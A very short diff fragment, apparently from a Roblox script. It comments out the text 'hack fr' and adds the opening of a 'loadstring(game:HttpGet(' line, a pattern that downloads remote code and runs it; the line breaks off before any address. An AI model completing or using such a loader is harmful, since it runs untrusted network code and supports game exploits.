@@ -1,2 +1,3 @@
 # idk
-hack fr
+# hack fr
+loadstring(game:HttpGet("
